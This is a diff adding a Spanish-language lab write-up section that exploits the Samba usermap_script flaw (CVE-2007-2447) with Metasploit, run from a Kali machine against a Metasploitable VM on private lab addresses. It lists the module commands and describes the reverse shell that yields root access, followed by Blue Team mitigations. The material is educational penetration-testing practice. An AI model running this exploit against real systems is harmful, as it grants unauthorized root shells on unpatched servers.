@@ -103,3 +103,48 @@ run
 - Usar SFTP en vez de FTP — cifrado y más seguro
 
 ---
+
+
+## 2.3 · Samba usermap_script — Metasploit
+
+**Herramienta:** Metasploit Framework
+
+**CVE:** CVE-2007-2447
+
+**¿Qué es esta vulnerabilidad?**
+Samba 3.0.20 a 3.0.25rc3 tiene una vulnerabilidad en el parámetro
+"username map script" que permite ejecutar comandos arbitrarios en
+el servidor sin autenticación. Cuando se envía un nombre de usuario
+con metacaracteres de shell, Samba los ejecuta directamente como root.
+Es una vulnerabilidad de 2007 que sigue presente en sistemas sin actualizar.
+
+**Comandos utilizados:**
+```bash
+search samba usermap
+use 0
+set RHOSTS 192.168.85.129
+set LHOST 192.168.85.128
+run
+```
+
+**Diferencia con el exploit anterior:**
+Este exploit usa una **reverse shell** — es Metasploitable quien se conecta
+de vuelta a Kali (192.168.85.129 → 192.168.85.128:4444), no al revés.
+Por eso el LHOST es imprescindible.
+
+**Resultado:**
+
+<img aquí tu captura />
+
+**Acceso conseguido:**
+- Usuario: root
+- Puerto atacado: 139 (NetBIOS/Samba)
+- Tipo de shell: Command shell (sin prompt)
+
+**Reflexión Blue Team — ¿Cómo se evita?**
+- Actualizar Samba a una versión parcheada
+- No exponer los puertos 139 y 445 a redes no confiables
+- Deshabilitar el parámetro "username map script" si no se usa
+- Firewall para limitar el acceso a servicios SMB
+
+---
